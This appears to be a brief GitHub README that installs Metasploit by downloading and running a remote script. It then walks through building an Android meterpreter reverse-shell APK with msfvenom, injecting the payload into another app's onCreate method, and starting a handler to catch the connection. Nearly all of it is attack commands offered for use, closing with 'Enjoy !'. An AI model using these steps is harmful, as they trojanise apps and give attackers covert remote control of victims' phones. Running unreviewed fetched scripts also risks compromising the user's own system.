# msf
Script to install Metasploit on Linux Terminal

#========= Open GCS Terminal ==========#

#========= Install Metasploit ==========#

$ curl https://raw.githubusercontent.com/TdimMax/msf/main/metasploit

$ chmod 755 metasploit

$ bash metasploit

#========= Create APK Payload ==========#

$ msfvenom -p android/meterpreter/reverse_tcp LHOST=host  LPORT=8080 R > /home/hack/payload.apk

#========== Inject payload on Android Application =========#

</> onCreate

</> invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

#========= Start Exploitation ==========#

$ msfconsole

$ use exploit/multi/handler

$ set PAYLOAD android/meterpreter/reverse_tcp

$ set LHOST host

$ set LPORT 8080

$ exploit

#========== Enjoy ! =========#
